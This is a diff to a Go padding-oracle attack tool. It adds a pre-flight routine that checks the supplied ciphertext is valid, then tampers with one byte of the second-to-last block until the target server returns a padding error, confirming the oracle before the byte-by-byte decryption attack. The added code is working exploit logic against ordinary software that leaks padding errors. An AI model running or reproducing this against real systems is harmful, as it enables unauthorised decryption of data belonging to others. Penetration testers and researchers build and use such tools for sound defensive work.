@@ -28,6 +28,12 @@ func decipher(cipherEncoded string) ([]byte, error) {
 	}
 	blockCount := len(cipher)/blockLen - 1
 
+	/* confirm padding oracle */
+	err = confirmOracle(cipher)
+	if err != nil {
+		return nil, err
+	}
+
 	/* now, we gonna tamper at every block separately,
 	thus we need to split up the whole payload into blockSize*2 sized chunks
 	- first half - the bytes we gonna tamper on
@@ -57,6 +63,51 @@ func decipher(cipherEncoded string) ([]byte, error) {
 	// that's it!
 	status.finishStatusBar()
 	return plainText, nil
+}
+
+func confirmOracle(cipher []byte) error {
+	status := currentStatus
+	/* carry out pre-flight checks:*/
+	//1. confirm that original cipher is valid (does not produce padding error)
+	status.printAction("Confirming provided cipher is valid...")
+	e, err := isPaddingError(cipher, nil)
+	if err != nil {
+		return err
+	}
+	if e {
+		return fmt.Errorf("Initial cipher produced padding error. It is not suitable therefore")
+	}
+
+	//2. confirm that tampered cipher produces padding error
+	status.printAction("Cofirming padding oracle...")
+	tamperPos := len(cipher) - *config.blockLen - 1
+	originalByte := cipher[tamperPos]
+	defer func() { cipher[tamperPos] = originalByte }()
+
+	/* tamper last byte  of pre-last block twice, to avoid case when we hit another valid padding
+	e.g. original cipher ends with \x02\x01, if we only would use one try, we can (unlikely) hit into
+	ending \x02\x02 which is also a valid padding*/
+	for i := 0; i <= 3; i++ {
+		// we can waste one try if hit original byte
+		if byte(i) == originalByte {
+			continue
+		}
+
+		cipher[tamperPos] = byte(i)
+		e, err = isPaddingError(cipher, nil)
+		if err != nil || e {
+			break
+		}
+	}
+
+	if err != nil {
+		return err
+	}
+
+	if !e {
+		return fmt.Errorf("padding oracle not confirmed, check the error string provided (-err option) and server response")
+	}
+	return nil
 }
 
 func decipherChunk(chunk []byte) ([]byte, error) {
